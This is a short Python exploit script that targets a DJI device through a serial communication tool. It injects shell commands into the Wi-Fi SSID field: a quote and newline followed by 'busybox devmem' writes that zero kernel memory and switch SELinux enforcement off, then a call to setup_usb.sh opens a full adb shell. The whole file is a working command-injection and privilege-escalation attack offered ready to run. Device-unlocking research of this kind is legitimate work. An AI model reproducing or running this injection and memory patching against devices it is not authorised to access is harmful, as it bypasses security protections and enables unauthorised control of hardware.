import os
import time
import sys

def set_ssid(ssid):
    #print(ssid)
    assert len(ssid) < 32, len(ssid)
    pkt = bytes([len(ssid)]) + ssid.encode('ascii')
    if os.path.exists('comm_serialtalk.py'):
        comm_serialtalk = 'comm_serialtalk.py'
    elif os.path.exists('.\\dji-firmware-tools\\comm_serialtalk.py'):
        comm_serialtalk = '.\\dji-firmware-tools\\comm_serialtalk.py'
    else:
        print('Could not find comm_serialtalk!')
        sys.exit(1)
    if os.system(f'python {comm_serialtalk} --bulk -a ACK_AFTER_EXEC --cmd_set=7 --cmd_id=8 --sender=1001 --receiver=0700  -x "{pkt.hex()}" -n10') != 0:
        print('Something went wrong during device communication, please start over!')
        sys.exit(1)

def main():
    print("Running exploit to start adb shell please wait ...")
    selinux_enforcing = 0xFFFFFF800964A06C - 0xFFFFFF8008000000
    set_ssid(f"'\nbusybox devmem 713028352 8 0\n")
    #set_ssid(f"'\nbusybox devmem {saved_command_line + 8} 8 0\n")
    #set_ssid(f"'\nbusybox devmem {saved_command_line + 16} 8 0\n")
    #set_ssid(f"'\nbusybox devmem {saved_command_line + 24} 8 0\n")
    set_ssid(f"'\nbusybox devmem {selinux_enforcing} 8 0\n")
    set_ssid(f"'\nsetup_usb.sh\n'")

    print('unlocked full adb shell')

if __name__ == '__main__':
    main()
